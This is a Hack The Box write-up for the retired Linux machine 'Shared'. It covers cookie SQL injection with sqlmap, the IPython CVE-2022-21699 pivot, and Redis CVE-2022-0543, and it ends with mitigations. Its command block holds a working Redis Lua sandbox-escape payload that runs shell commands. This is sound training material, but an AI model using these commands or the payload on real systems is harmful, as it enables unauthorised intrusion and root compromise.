---
machine: Shared
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, sqli, ipython, cve-2022-21699, redis, lua]
---

# Shared — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

SQLi in the store session cookie leaks SSH credentials. On the host, an IPython execution flaw (CVE-2022-21699) pivots; reversing a binary reveals Redis credentials and Debian Lua sandbox CVE-2022-0543 gives root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,6379 <IP>
sqlmap --url "http://shared.htb/" --cookie="custom_cart=*" --batch --dump
ssh <USER>@<IP> -p 22
# IPython
ipython
# Binary with credentials
strings /usr/local/bin/<BIN> | grep -i redis
# Redis CVE-2022-0543
redis-cli -h 127.0.0.1
eval 'local f=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io=f(); io.popen("id"):read("*a")' 0
```

## Enumeration

- Store with a session cookie concatenated into a SQL query.
- IPython with a shared history or profile directory.
- Exposed Redis and a custom binary with embedded credentials.

## Initial access

The `custom_cart` cookie is used without parameterization; `sqlmap --cookie` enumerates tables and recovers users and passwords. One is valid over SSH.

## Privilege escalation

IPython processes a controllable file or profile and executes code (CVE-2022-21699), allowing a pivot to another user. That user runs a binary containing Redis credentials; with them, CVE-2022-0543 escapes the Lua sandbox and executes as root.

## Evidence

- Vulnerable cookie and SQLi dump.
- Initial SSH access.
- IPython running commands and Redis Lua outside the sandbox.

## Lessons learned

- Cookies are not trusted data for SQL.
- IPython profiles are executable code.
- Redis with Lua and old Debian packages can escape the sandbox.

## Mitigation and detection

- Parameterize queries and sign cookies.
- Isolate IPython profiles and review their content.
- Update Redis and restrict access to localhost.

## References

- [0xdf — Shared](https://0xdf.gitlab.io/2022/11/12/htb-shared.html)
- [NVD — CVE-2022-21699](https://nvd.nist.gov/vuln/detail/CVE-2022-21699)
- [Hack The Box — Shared](https://app.hackthebox.com/machines/shared)
